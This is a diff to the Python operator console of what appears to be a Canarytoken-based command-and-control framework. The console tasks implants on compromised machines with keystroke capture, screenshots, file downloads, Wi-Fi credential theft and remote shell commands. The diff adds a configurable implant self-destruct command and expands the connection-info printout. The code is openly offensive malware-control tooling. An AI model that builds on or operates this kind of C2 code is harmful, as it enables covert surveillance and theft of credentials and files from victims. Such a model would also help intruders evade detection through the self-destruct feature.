@@ -44,6 +44,7 @@ done = False
 doneWaitForImplant = False
 chunkedlen = 0
 screenshotdone = False
+selfdestuct = 168
 ps = False
 waitForKeys = False
 lootpath = "loot/template"
@@ -142,6 +143,7 @@ def generate_canarytoken():
         print(Fore.BLUE + "[!]" + Fore.RESET + " Using key: " + str(key.decode()) + " for encryption")
         print(Fore.BLUE + "[!]" + Fore.RESET + " URL: " + url)
         print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
+        print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will self-destruct after: " + str(selfdestuct) + " hours of no activity")
         print(Fore.BLUE + "[!]" + Fore.RESET + " UUID For Implant: " + trackingString)
         print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL)
 
@@ -152,7 +154,7 @@ def taskCommand(cmd):
         cmd = "pwdtask:" + cmd
 
     if cmd.startswith("fallback:") or cmd.startswith("keystrokes:") or cmd.startswith("screenshot:") or cmd.startswith(
-            "download:") or cmd.startswith("wificreds:"):
+            "download:") or cmd.startswith("wificreds:") or cmd.startswith("self-destruct:"):
         cmd = cmd
 
     else:
@@ -530,8 +532,6 @@ def implantSleep(time, jitter):
     response = requests.get(url, headers=headers)
 
 
-
-
 def keystrokes(keychoice):
     global lastdictsize
     global waitForKeys
@@ -680,6 +680,7 @@ def main():
     global pwd
     global connected
     global url
+    global selfdestuct
     global lootpath
     global requestedfile
     lootpath = "loot/template/"
@@ -722,7 +723,7 @@ def main():
 
                     except Exception as e:
                         print(e)
-                        print(Fore.RED + "[-]" + Fore.RESET + " Error, with your input. Please try again.")
+                        print(Fore.RED + "[-]" + Fore.RESET + " Error, with the management URL. Please try again.")
                         continue
 
 
@@ -821,20 +822,6 @@ def main():
                                 taskCommand(cmd)
                                 lastdictsize = getResults(lastdictsize)
                                 print("")
-                                """
-                                TODO - Save output from post-exp
-                                try:
-                                    with open(lootpath + "post-exp.txt", "a+") as f:
-                                        f.write(lastdictsize)
-                                        f.close()
-                                    print(
-                                        Fore.BLUE + "\n[!]" + Fore.RESET + " Saved/Updated post-exp command result: " + lootpath + "post-exp.txt\n")
-
-                                except Exception as e:
-                                    print(Fore.RED + "[-]" + Fore.RESET + " Error saving result: " + str(e))
-                                    pass
-                                """
-
                             # Else - means `back` command was entered indicating exit of shell
                             else:
                                 break
@@ -862,6 +849,19 @@ def main():
                         time.sleep(1)
                         taskCommand("download:" + requestedfile)
                         lastdictsize = getResults(lastdictsize)
+                    else:
+                        print(
+                            Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+
+                elif cmd.startswith("self-destruct "):
+                    if connected:
+                        if cmd.split("self-destruct ")[1].isdigit():
+                            selfdestuct = cmd.split("self-destruct ")[1]
+                            taskCommand("self-destruct:" + selfdestuct)
+                            print(Fore.BLUE + "\n[!]" + Fore.RESET + " Implant will now self-destruct after " + selfdestuct + " hours of no activity\n")
+                        else:
+                            print(Fore.RED + "[-]" + Fore.RESET + " Self-destruct time must be a positive integer \n")
+
                     else:
                         print(
                             Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
@@ -916,11 +916,14 @@ def main():
 
                 elif cmd.lower() == "canary-info":
                     if connected:
-                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Token: " + token)
-                        print(Fore.BLUE + "[!]" + Fore.RESET + " Encryption of traffic: " + str(encrypted))
-                        print(Fore.BLUE + "[!]" + Fore.RESET + " Alert URL: " + url)
+                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Alert Token: " + token)
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Traffic Encryption: " + str(encrypted))
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Using key: " + str(key.decode()) + " for encryption")
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " URL: " + url)
                         print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
-                        print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL + "\n")
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Implant will self-destruct after: " + str(selfdestuct) + " hours of no activity")
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " UUID For Implant: " + trackingString)
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL)
 
                     else:
                         print(
